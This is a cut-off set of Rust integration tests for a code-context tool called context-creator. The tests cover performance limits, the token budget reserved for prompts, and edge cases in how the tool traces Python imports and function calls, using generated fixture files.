Imports: context_creator::core::cache::FileCache, context_creator, context_creator::core::prioritizer::prioritize_files, std::fs, std::path::Path, std::sync::Arc, std::time::Instant, tempfile::TempDir

Type references: context_creator::core::cache::FileCache.FileCache, prioritize_files, fs, std::path::Path.Path, std::time::Instant.Instant, tempfile::TempDir.TempDir, std::path::Path.Path, std::path::Path.Path, PathBuf, context_creator.ContextOptions

```rust
//! Performance tests to verify optimization requirements

use context_creator::core::cache::FileCache;
use context_creator::core::context_builder::{generate_markdown, ContextOptions};
use context_creator::core::prioritizer::prioritize_files;
use context_creator::core::walker::{walk_directory, WalkOptions};
use std::fs;
use std::path::Path;
use std::sync::Arc;
use std::time::Instant;
use tempfile::TempDir;

/// Create a test project with many files
fn create_large_test_project(base_dir: &Path, file_count: usize) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();

    // Create directory structure
    fs::create_dir_all(base_dir.join("src/core")).unwrap();
    fs::create_dir_all(base_dir.join("src/utils")).unwrap();
    fs::create_dir_all(base_dir.join("tests")).unwrap();
    fs::create_dir_all(base_dir.join("docs")).unwrap();

    // Generate files with realistic content
    for i in 0..file_count {
        let (path, content) = match i % 10 {
            0 => (
                format!("src/core/module_{i}.rs"),
                format!("//! Module {i}\n\nuse std::collections::HashMap;\n\npub struct Module{i} {{\n    data: HashMap<String, String>,\n}}\n\nimpl Module{i} {{\n    pub fn new() -> Self {{\n        Self {{ data: HashMap::new() }}\n    }}\n}}\n"),
            ),
            1 => (
                format!("src/utils/helper_{i}.rs"),
                format!("//! Helper {i}\n\npub fn process_data(input: &str) -> String {{\n    input.trim().to_uppercase()\n}}\n\n#[cfg(test)]\nmod tests {{\n    use super::*;\n    \n    #[test]\n    fn test_process() {{\n        assert_eq!(process_data(\"hello\"), \"HELLO\");\n    }}\n}}\n"),
            ),
            2 => (
                format!("tests/test_{i}.rs"),
                format!("#[test]\nfn test_module_{i}() {{\n    let result = 2 + 2;\n    assert_eq!(result, 4);\n}}\n"),
            ),
            3 => (
                format!("docs/doc_{i}.md"),
                format!("# Documentation {i}\n\nThis is documentation for module {i}.\n\n## Usage\n\n```rust\nlet module = Module::new();\n```\n"),
            ),
            _ => (
                format!("src/file_{i}.rs"),
                format!("//! File {i}\n\nconst DATA: &str = \"{}\";\n\npub fn get_data() -> &'static str {{\n    DATA\n}}\n", "x".repeat(100)),
            ),
        };

        let file_path = base_dir.join(&path);
        if let Some(parent) = file_path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&file_path, content).unwrap();
        files.push(file_path);
    }

    files
}

#[test]
fn test_performance_1000_files_under_1_second() {
    // Create test directory with 1000 files
    let temp_dir = TempDir::new().unwrap();
    let _files = create_large_test_project(temp_dir.path(), 1000);

    // Measure end-to-end processing time
    let start = Instant::now();

    // Walk directory
    let walk_options = WalkOptions::default();
    let files = walk_directory(temp_dir.path(), walk_options).unwrap();
    assert_eq!(files.len(), 1000, "Should find all 1000 files");

    // Create cache
    let cache = Arc::new(FileCache::new());

    // Prioritize files with token limit
    let context_options = ContextOptions {
        max_tokens: Some(100_000),
        include_tree: true,
        include_stats: true,
        group_by_type: false,
        sort_by_priority: true,
        file_header_template: "## {path}".to_string(),
        doc_header_template: "# Code Context".to_string(),
        include_toc: true,
        enhanced_context: false,
    };

    let prioritized_files = prioritize_files(files, &context_options, cache.clone()).unwrap();

    // Generate markdown
    let _markdown = generate_markdown(prioritized_files, context_options, cache).unwrap();

    let elapsed = start.elapsed();

    // Verify performance requirement: processing 1000 files should take <1 second
    // In CI environments, allow up to 3 seconds due to slower hardware
    let time_limit = if std::env::var("CI").is_ok() {
        3.0
    } else {
        1.0
    };
    assert!(
        elapsed.as_secs_f64() < time_limit,
        "Processing 1000 files took {:.3}s, which exceeds the {} second requirement",
        elapsed.as_secs_f64(),
        time_limit
    );

    println!(
        "âœ… Performance test passed: 1000 files processed in {:.3}s",
        elapsed.as_secs_f64()
    );
}

#[test]
fn test_cache_eliminates_redundant_io() {
    let temp_dir = TempDir::new().unwrap();
    let test_file = temp_dir.path().join("test.txt");
    fs::write(&test_file, "test content").unwrap();

    let cache = Arc::new(FileCache::new());

    // First read - loads from disk
    let content1 = cache.get_or_load(&test_file).unwrap();
    let stats1 = cache.stats();
    assert_eq!(stats1.entries, 1);

    // Subsequent reads - should hit cache
    for _ in 0..10 {
        let content = cache.get_or_load(&test_file).unwrap();
        assert!(Arc::ptr_eq(&content1, &content), "Should return same Arc");
    }

    let stats2 = cache.stats();
    assert_eq!(stats2.entries, 1, "Cache should still have only 1 entry");

    println!("âœ… Cache test passed: 10 reads returned the same Arc reference");
}
```

## tests/prompt_token_reservation_test.rs

Imports: clap::Parser, context_creator::cli::Config, std::fs, tempfile::TempDir, config

Type references: clap::Parser.Parser, context_creator::cli::Config.Config, fs, tempfile::TempDir.TempDir

```rust
use clap::Parser;
use context_creator::cli::Config;
use std::fs;
use tempfile::TempDir;

#[test]
fn test_prompt_token_reservation_integration() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a config file with a specific token limit
    let config_content = r#"
[tokens]
gemini = 10000
"#;

    fs::write(&config_path, config_content).unwrap();

    // Test with a prompt that should reserve tokens
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "This is a longer test prompt that should use several tokens for testing the reservation system",
        "--tool",
        "gemini",
        "--config",
        config_path.to_str().unwrap(),
    ]);

    config.load_from_file().unwrap();

    // The effective max tokens should be the full config limit
    assert_eq!(config.get_effective_max_tokens(), Some(10000));

    // The effective context tokens should be less due to prompt reservation
    let context_tokens = config.get_effective_context_tokens().unwrap();
    assert!(
        context_tokens < 10000,
        "Context tokens should be less than max due to prompt reservation"
    );
    assert!(
        context_tokens > 8000,
        "Context tokens should still be most of the budget"
    );

    // The difference should account for prompt tokens + safety buffer
    let reserved = 10000 - context_tokens;
    assert!(reserved >= 1000, "Should reserve at least safety buffer");
    assert!(reserved <= 2000, "Should not reserve too much"); // Generous upper bound
}

#[test]
fn test_no_prompt_uses_full_budget() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a config file with a specific token limit
    let config_content = r#"
[tokens]
gemini = 10000
"#;

    fs::write(&config_path, config_content).unwrap();

    // Test without prompt (using file processing)
    let mut config = Config::parse_from([
        "context-creator",
        "--tool",
        "gemini",
        "--config",
        config_path.to_str().unwrap(),
        temp_dir.path().to_str().unwrap(),
    ]);

    config.load_from_file().unwrap();

    // Without prompt, effective max and context tokens should be the same
    assert_eq!(config.get_effective_max_tokens(), None); // No auto-limits without prompt
    assert_eq!(config.get_effective_context_tokens(), None);
}

#[test]
fn test_explicit_cli_override_with_prompt_reservation() {
    // Test that explicit CLI token limit is properly reserved for prompts
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Test prompt for explicit override",
        "--max-tokens",
        "5000",
        "--tool",
        "gemini",
    ]);

    // Explicit CLI value
    assert_eq!(config.get_effective_max_tokens(), Some(5000));

    // Context should be less due to prompt reservation
    let context_tokens = config.get_effective_context_tokens().unwrap();
    assert!(context_tokens < 5000);
    assert!(context_tokens > 3500); // Should still be most of the budget
}
```

## tests/python_semantic_edge_cases_test.rs

Imports: std::fs, tempfile::TempDir

Type references: fs, tempfile::TempDir.TempDir

```rust
//! Edge case tests for Python semantic analysis

use std::fs;
use tempfile::TempDir;

/// Test Python circular imports
#[test]
fn test_python_circular_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create circular import: a.py -> b.py -> c.py -> a.py
    fs::write(
        src_dir.join("a.py"),
        r#"
from b import function_b

def function_a():
    return function_b() + 1
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("b.py"),
        r#"
from c import function_c

def function_b():
    return function_c() + 2
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("c.py"),
        r#"
# Circular import - typically would cause issues at runtime
# from a import function_a

def function_c():
    # Lazy import to avoid circular import error
    from a import function_a
    return 10
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle circular imports without crashing
    assert!(output.status.success());

    // Each file should show its imports
    assert!(stdout.contains("a.py"));
    assert!(stdout.contains("b.py"));
    assert!(stdout.contains("c.py"));
}

/// Test Python files with no imports
#[test]
fn test_python_no_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Standalone file with no imports
    fs::write(
        src_dir.join("standalone.py"),
        r#"
# No imports, just pure Python
CONSTANT = 42

def pure_function(x, y):
    """A function with no dependencies."""
    return x + y

class StandaloneClass:
    """A class with no external dependencies."""
    
    def __init__(self):
        self.value = CONSTANT
    
    def method(self):
        return self.value * 2

# Script execution
if __name__ == "__main__":
    obj = StandaloneClass()
    result = pure_function(10, obj.method())
    print(f"Result: {result}")
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    let standalone_section = stdout
        .split("## standalone.py")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    // Should not show import sections for files without imports
    assert!(!standalone_section.contains("Imports:"));
    assert!(!standalone_section.contains("Imported by:"));
}

/// Test Python with many import styles
#[test]
fn test_python_import_variations() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("imports.py"),
        r#"
# Standard library imports
import os
import sys
import json
from pathlib import Path
from collections import defaultdict, Counter
from typing import (
    List, Dict, Optional, Union,
    Tuple, Set, Any, TypeVar,
    Generic, Protocol, Final
)

# Try different import styles
import math as mathematics
from datetime import datetime as dt
from itertools import *  # Star import
from functools import (
    wraps,
    lru_cache,
    partial as make_partial
)

# Conditional imports
try:
    import numpy as np
except ImportError:
    np = None

if sys.version_info >= (3, 9):
    from typing import Annotated
else:
    try:
        from typing_extensions import Annotated
    except ImportError:
        Annotated = None

# Type checking imports
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from some_heavy_module import HeavyClass

# Local imports with different styles
from . import sibling_module
from .. import parent_module
from ..utils import helper
from ...root import config

# Function using imports
def process_data(data: List[Dict[str, Any]]) -> Counter:
    path = Path("data.json")
    counts = Counter()
    
    if np is not None:
        # Use numpy if available
        pass
    
    return counts
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle various import styles
    assert!(output.status.success());
    assert!(stdout.contains("imports.py"));
}

/// Test Python namespace packages
#[test]
fn test_python_namespace_packages() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create namespace package structure (no __init__.py in namespace)
    let ns_dir = root.join("namespace_pkg");
    let sub1_dir = ns_dir.join("sub1");
    let sub2_dir = ns_dir.join("sub2");

    fs::create_dir_all(&sub1_dir).unwrap();
    fs::create_dir_all(&sub2_dir).unwrap();

    // sub1 has __init__.py
    fs::write(sub1_dir.join("__init__.py"), "").unwrap();
    fs::write(
        sub1_dir.join("module1.py"),
        r#"
def function1():
    return "from sub1"
"#,
    )
    .unwrap();

    // sub2 has __init__.py
    fs::write(sub2_dir.join("__init__.py"), "").unwrap();
    fs::write(
        sub2_dir.join("module2.py"),
        r#"
def function2():
    return "from sub2"
"#,
    )
    .unwrap();

    // User script
    fs::write(
        root.join("use_namespace.py"),
        r#"
# Import from namespace package
from namespace_pkg.sub1 import module1
from namespace_pkg.sub2 import module2

def main():
    print(module1.function1())
    print(module2.function2())
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(root)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle namespace packages
    assert!(output.status.success());
}

/// Test Python with decorators and metaclasses
#[test]
fn test_python_decorators_metaclasses() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("decorators.py"),
        r#"
from functools import wraps
from typing import Callable, TypeVar, Any
import time

T = TypeVar('T')

def timer(func: Callable[..., T]) -> Callable[..., T]:
    @wraps(func)
    def wrapper(*args: Any, **kwargs: Any) -> T:
        start = time.time()
        result = func(*args, **kwargs)
        print(f"{func.__name__} took {time.time() - start:.4f}s")
        return result
    return wrapper

def memoize(func: Callable[..., T]) -> Callable[..., T]:
    cache: Dict[Any, T] = {}
    
    @wraps(func)
    def wrapper(*args: Any) -> T:
        if args in cache:
            return cache[args]
        result = func(*args)
        cache[args] = result
        return result
    return wrapper

def singleton(cls):
    instances = {}
    @wraps(cls)
    def get_instance(*args, **kwargs):
        if cls not in instances:
            instances[cls] = cls(*args, **kwargs)
        return instances[cls]
    return get_instance
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("metaclasses.py"),
        r#"
from abc import ABCMeta, abstractmethod
from typing import Type, Any

class SingletonMeta(type):
    _instances = {}
    
    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            cls._instances[cls] = super().__call__(*args, **kwargs)
        return cls._instances[cls]

class AutoPropertyMeta(type):
    def __new__(mcs, name: str, bases: tuple, attrs: dict):
        # Auto-generate properties for _private attributes
        for key, value in list(attrs.items()):
            if key.startswith('_') and not key.startswith('__'):
                prop_name = key[1:]  # Remove underscore
                attrs[prop_name] = property(
                    lambda self, k=key: getattr(self, k),
                    lambda self, v, k=key: setattr(self, k, v)
                )
        return super().__new__(mcs, name, bases, attrs)

class AbstractBase(metaclass=ABCMeta):
    @abstractmethod
    def process(self) -> Any:
        pass
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("usage.py"),
        r#"
from decorators import timer, memoize, singleton
from metaclasses import SingletonMeta, AutoPropertyMeta, AbstractBase

@timer
@memoize
def fibonacci(n: int) -> int:
    if n < 2:
        return n
    return fibonacci(n - 1) + fibonacci(n - 2)

@singleton
class Config:
    def __init__(self):
        self.settings = {}

class Database(metaclass=SingletonMeta):
    def __init__(self):
        self.connection = None

class Model(metaclass=AutoPropertyMeta):
    def __init__(self):
        self._id = None
        self._name = None

class ConcreteProcessor(AbstractBase):
    def process(self):
        return "Processing..."

# Usage
if __name__ == "__main__":
    result = fibonacci(30)
    config1 = Config()
    config2 = Config()
    assert config1 is config2
    
    db1 = Database()
    db2 = Database()
    assert db1 is db2
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // Check that usage.py imports from both modules
    assert!(stdout.contains("usage.py"));
    if stdout.contains("Imports:") {
        // Look for the usage.py section and get everything until the next file or end
        let content = if let Some(start_idx) = stdout.find("## usage.py") {
            let section_start = &stdout[start_idx..];
            // Find the next ## (another file) or use the whole remaining content
            if let Some(next_file_idx) = section_start[11..].find("##") {
                &section_start[..next_file_idx + 11]
            } else {
                section_start
            }
        } else {
            ""
        };

        assert!(
            content.contains("decorators") && content.contains("metaclasses"),
            "usage.py should import from both modules. Found: '{content}'"
        );
    }
}

/// Test Python with async/await
#[test]
fn test_python_async_await() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("async_utils.py"),
        r#"
import asyncio
from typing import List, Coroutine, Any

async def fetch_data(url: str) -> str:
    # Simulate async fetch
    await asyncio.sleep(0.1)
    return f"Data from {url}"

async def process_batch(items: List[str]) -> List[str]:
    tasks = [fetch_data(item) for item in items]
    results = await asyncio.gather(*tasks)
    return results

class AsyncManager:
    def __init__(self):
        self.queue = asyncio.Queue()
    
    async def add_task(self, task: Any) -> None:
        await self.queue.put(task)
    
    async def process_tasks(self) -> None:
        while not self.queue.empty():
            task = await self.queue.get()
            # Process task
            await asyncio.sleep(0.01)

async def async_context_manager():
    class AsyncResource:
        async def __aenter__(self):
            await asyncio.sleep(0.01)
            return self
        
        async def __aexit__(self, exc_type, exc_val, exc_tb):
            await asyncio.sleep(0.01)
    
    async with AsyncResource() as resource:
        return resource
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("async_main.py"),
        r#"
import asyncio
from async_utils import fetch_data, process_batch, AsyncManager

async def main():
    # Single await
    data = await fetch_data("https://example.com")
    print(data)
    
    # Multiple awaits
    urls = ["url1", "url2", "url3"]
    results = await process_batch(urls)
    
    # Async with manager
    manager = AsyncManager()
    await manager.add_task("task1")
    await manager.process_tasks()
    
    # Async for (simulated)
    async def async_generator():
        for i in range(3):
            await asyncio.sleep(0.01)
            yield i
    
    async for value in async_generator():
        print(value)

if __name__ == "__main__":
    asyncio.run(main())
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // Check imports
    assert!(stdout.contains("async_main.py"));
    assert!(stdout.contains("Imports: async_utils"));

    // Check function calls tracking
    if stdout.contains("Function calls:") {
        // Look for the async_main.py section and get everything until the next file or end
        let content = if let Some(start_idx) = stdout.find("## async_main.py") {
            let section_start = &stdout[start_idx..];
            // Find the next ## (another file) or use the whole remaining content
            if let Some(next_file_idx) = section_start[16..].find("##") {
                &section_start[..next_file_idx + 16]
            } else {
                section_start
            }
        } else {
            ""
        };

        assert!(
            content.contains("fetch_data") || content.contains("process_batch"),
            "Should track async function calls. Content: {content}"
        );
    }
}

/// Test Python with complex package structure
#[test]
fn test_python_complex_package_structure() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create complex package structure
    let pkg = root.join("myapp");
    let core = pkg.join("core");
    let utils = pkg.join("utils");
    let plugins = pkg.join("plugins");
    let plugin1 = plugins.join("plugin1");
    let tests = pkg.join("tests");

    fs::create_dir_all(&core).unwrap();
    fs::create_dir_all(&utils).unwrap();
    fs::create_dir_all(&plugin1).unwrap();
    fs::create_dir_all(&tests).unwrap();

    // Package root
    fs::write(
        pkg.join("__init__.py"),
        r#"
"""MyApp - A complex application."""
from .core import App
from .version import __version__

__all__ = ['App', '__version__']
"#,
    )
    .unwrap();

    fs::write(pkg.join("version.py"), r#"__version__ = "1.0.0""#).unwrap();

    // Core module
    fs::write(core.join("__init__.py"), r#"from .app import App"#).unwrap();

    fs::write(
        core.join("app.py"),
        r#"
from ..utils import Logger, Config
from ..plugins import load_plugins

class App:
    def __init__(self):
        self.logger = Logger()
        self.config = Config()
        self.plugins = load_plugins()
    
    def run(self):
        self.logger.info("App starting")
        for plugin in self.plugins:
            plugin.execute()
"#,
    )
    .unwrap();

    // Utils module
    fs::write(
        utils.join("__init__.py"),
        r#"
from .logger import Logger
from .config import Config

__all__ = ['Logger', 'Config']
"#,
    )
    .unwrap();

    fs::write(
        utils.join("logger.py"),
        r#"
import logging

class Logger:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def info(self, msg):
        self.logger.info(msg)
"#,
    )
    .unwrap();

    fs::write(
        utils.join("config.py"),
        r#"
import json
from pathlib import Path

class Config:
    def __init__(self):
        self.data = {}
    
    def load(self, path: Path):
        with open(path) as f:
            self.data = json.load(f)
"#,
    )
    .unwrap();

    // Plugins
    fs::write(
        plugins.join("__init__.py"),
        r#"
from .loader import load_plugins

__all__ = ['load_plugins']
"#,
    )
    .unwrap();

    fs::write(
        plugins.join("loader.py"),
        r#"
from .plugin1 import Plugin1

def load_plugins():
    return [Plugin1()]
"#,
    )
    .unwrap();

    fs::write(
        plugin1.join("__init__.py"),
        r#"from .plugin import Plugin1"#,
    )
    .unwrap();

    fs::write(
        plugin1.join("plugin.py"),
        r#"
from ...utils import Logger

class Plugin1:
    def __init__(self):
        self.logger = Logger()
    
    def execute(self):
        self.logger.info("Plugin1 executing")
"#,
    )
    .unwrap();

    // Main entry point
    fs::write(
        root.join("main.py"),
        r#"
from myapp import App

def main():
    app = App()
    app.run()

if __name__ == "__main__":
    main()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(root)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // Verify main imports
    assert!(stdout.contains("main.py"));
    assert!(stdout.contains("Imports: myapp"));

    // Verify internal package imports are tracked
    assert!(stdout.contains("app.py"));
    assert!(stdout.contains("logger.py"));
    assert!(stdout.contains("config.py"));
}

/// Test Python files with syntax errors
#[test]
fn test_python_syntax_errors() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("syntax_error.py"),
        r#"
import os

def broken_function()
    # Missing colon
    print("This won't parse")

class IncompleteClass:
    def __init__(self):
        self.value = 

# Unclosed string
message = "This string never ends...
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("good.py"),
        r#"
# This file is fine
def working_function():
    return 42
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should not crash on syntax errors
    assert!(output.status.success());

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("syntax_error.py"));
    assert!(stdout.contains("good.py"));
}

/// Test Python with very long import lists
#[test]
fn test_python_many_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create many modules
    let module_count = 50;
    for i in 0..module_count {
        fs::write(
            src_dir.join(format!("module{i}.py")),
            format!(
                r#"
def function{i}():
    return {i}
"#
            ),
        )
        .unwrap();
    }

    // Create main file that imports all
    let mut imports = String::new();
    let mut calls = String::new();

    for i in 0..module_count {
        imports.push_str(&format!("from module{i} import function{i}\n"));
        calls.push_str(&format!("    result += function{i}()\n"));
    }

    fs::write(
        src_dir.join("main.py"),
        format!(
            r#"
{imports}

def main():
    result = 0
{calls}
    return result

if __name__ == "__main__":
    print(main())
"#
        ),
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());
    assert!(stdout.contains("main.py"));

    // Should handle many imports
    if stdout.contains("Imports:") {
        assert!(stdout.contains("module0") || stdout.contains("module1"));
    }
}

/// Test Python method calls and attribute access
#[test]
fn test_python_method_calls_and_attributes() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("methods.py"),
        r#"
import json
from pathlib import Path

class DataProcessor:
    def __init__(self):
        self.data = []
        self.path = Path.cwd()
    
    def load_data(self, filename):
        with open(filename) as f:
            self.data = json.load(f)
    
    def process(self):
        # Method calls on self
        self.validate()
        self.transform()
        self.save()
        
        # Chained method calls
        result = self.filter_data().map_values().reduce_results()
        return result
    
    def validate(self):
        return len(self.data) > 0
    
    def transform(self):
        return [item.upper() for item in self.data]
    
    def save(self):
        self.path.write_text(json.dumps(self.data))
    
    def filter_data(self):
        return self
    
    def map_values(self):
        return self
    
    def reduce_results(self):
        return self.data

def use_processor():
    processor = DataProcessor()
    
    # Various method calls
    processor.load_data("data.json")
    processor.process()
    
    # Attribute access
    print(processor.data)
    print(processor.path.name)
    
    # Method calls on imported objects
    path = Path("test.txt")
    path.exists()
    path.is_file()
    path.read_text()
    
    # JSON method calls
    data = {"key": "value"}
    json_str = json.dumps(data)
    parsed = json.loads(json_str)
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // Should track method calls
    if stdout.contains("Function calls:") {
        // Look for the methods.py section and get everything until the next file or end
        let content = if let Some(start_idx) = stdout.find("## methods.py") {
            let section_start = &stdout[start_idx..];
            // Find the next ## (another file) or use the whole remaining content
            if let Some(next_file_idx) = section_start[14..].find("##") {
                &section_start[..next_file_idx + 14]
            } else {
                section_start
            }
        } else {
            ""
        };

        // Should track various types of method calls
        assert!(
            content.contains("load_data")
                || content.contains("process")
                || content.contains("json.load")
                || content.contains("json.dumps")
                || content.contains("Path.cwd"),
            "Should track method calls including json.load, json.dumps, etc. Content: {content}"
        );
    }
}

/// Test Python list/dict comprehensions with function calls
#[test]
fn test_python_comprehension_function_tracking() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("comprehensions.py"),
        r#"
import math
from utils import process_item, validate_item, transform_data

def complex_comprehensions():
    # List comprehension with function calls
    data = [1, 2, 3, 4, 5]
    
    # Functions called inside comprehensions
    processed = [process_item(x) for x in data if validate_item(x)]
    
    # Math functions in comprehensions  
    squares = [math.sqrt(x) for x in data]
    powers = [math.pow(x, 2) for x in data]
    
    # Dict comprehension with function calls
    data_dict = {
        str(x): transform_data(x) 
        for x in data 
        if validate_item(x)
    }
    
    # Set comprehension with multiple function calls
    unique_processed = {
        process_item(transform_data(x))
        for x in data
    }
    
    # Nested comprehensions with function calls
    matrix = [
        [math.sin(i * j) for j in range(5)]
        for i in range(5)
    ]
    
    # Generator expression with function calls
    gen = (process_item(x) for x in data if x > 2)
    
    # Using map, filter with functions
    mapped = list(map(process_item, data))
    filtered = list(filter(validate_item, data))
    
    return processed, data_dict, unique_processed

# Function calls in lambda expressions
operations = {
    'process': lambda x: process_item(x),
    'validate': lambda x: validate_item(x),
    'transform': lambda x: transform_data(x),
    'complex': lambda x: process_item(transform_data(x))
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("utils.py"),
        r#"
def process_item(item):
    return item * 2

def validate_item(item):
    return item > 0

def transform_data(data):
    return data ** 2
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // Should track imports
    assert!(stdout.contains("comprehensions.py"));
    assert!(stdout.contains("Imports: utils"));

    // Should track function calls inside comprehensions
    if stdout.contains("Function calls:") {
        // Look for the comprehensions.py section and get everything until the next file or end
        let content = if let Some(start_idx) = stdout.find("## comprehensions.py") {
            let section_start = &stdout[start_idx..];
            // Find the next ## (another file) or use the whole remaining content
            if let Some(next_file_idx) = section_start[20..].find("##") {
                &section_start[..next_file_idx + 20]
            } else {
                section_start
            }
        } else {
            ""
        };

        assert!(
            content.contains("process_item")
                || content.contains("validate_item")
                || content.contains("transform_data")
                || content.contains("math.sqrt")
                || content.contains("math.pow"),
            "Should track function calls inside comprehensions and lambdas. Content: {content}"
        );
    }
}

/// Test Python imports from __init__.py and package structure
#[test]
fn test_python_init_file_imports() {
    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create package with __init__.py imports
    let pkg = root.join("mypackage");
    let subpkg = pkg.join("submodule");
    fs::create_dir_all(&subpkg).unwrap();

    // Root package __init__.py with imports and re-exports
    fs::write(
        pkg.join("__init__.py"),
        r#"
"""Main package with various import patterns."""

# Import from submodules
from .core import Engine, Config
from .utils import helper, utility_function
from .constants import DEFAULT_TIMEOUT, MAX_RETRIES

# Import and rename
from .processor import DataProcessor as Processor

# Import all from a module
from .types import *

# Conditional imports
import sys
if sys.version_info >= (3, 8):
    from .modern import ModernFeature
else:
    from .legacy import LegacyFeature as ModernFeature

# Lazy imports in functions
def get_optional_module():
    try:
        from .optional import OptionalFeature
        return OptionalFeature
    except ImportError:
        return None

# Re-export pattern
__all__ = [
    'Engine',
    'Config', 
    'Processor',
    'helper',
    'DEFAULT_TIMEOUT',
    'ModernFeature'
]

# Package-level initialization
_initialized = False

def init_package():
    global _initialized
    if not _initialized:
        from .setup import configure
        configure()
        _initialized = True
"#,
    )
    .unwrap();

    // Create referenced modules
    fs::write(
        pkg.join("core.py"),
        r#"
class Engine:
    pass

class Config:
    pass
"#,
    )
    .unwrap();

    fs::write(
        pkg.join("utils.py"),
        r#"
def helper():
    return "helper"

def utility_function():
    return "utility"
"#,
    )
    .unwrap();

    fs::write(
        pkg.join("constants.py"),
        r#"
DEFAULT_TIMEOUT = 30
MAX_RETRIES = 3
"#,
    )
    .unwrap();

    fs::write(
        pkg.join("processor.py"),
        r#"
class DataProcessor:
    pass
"#,
    )
    .unwrap();

    fs::write(
        pkg.join("types.py"),
        r#"
class TypeA:
    pass

class TypeB:
    pass
"#,
    )
    .unwrap();

    fs::write(
        pkg.join("modern.py"),
        r#"
class ModernFeature:
